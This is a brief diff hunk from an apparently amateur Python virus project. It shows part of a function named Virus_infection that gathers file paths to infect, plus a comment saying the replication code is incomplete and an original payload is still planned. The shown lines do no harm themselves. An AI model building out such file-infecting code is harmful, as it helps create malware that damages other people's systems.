@@ -51,7 +51,7 @@ def Virus_infection():
                     infect.append(route+'/'+name)
             return infect
 # the infecting code is not complete it does not upload itslef fully yet and it looks similair to the examples
-#i found but the pyload will be completely diffrent and original.
+#i found but the payload will be completely diffrent and original
        
 
 
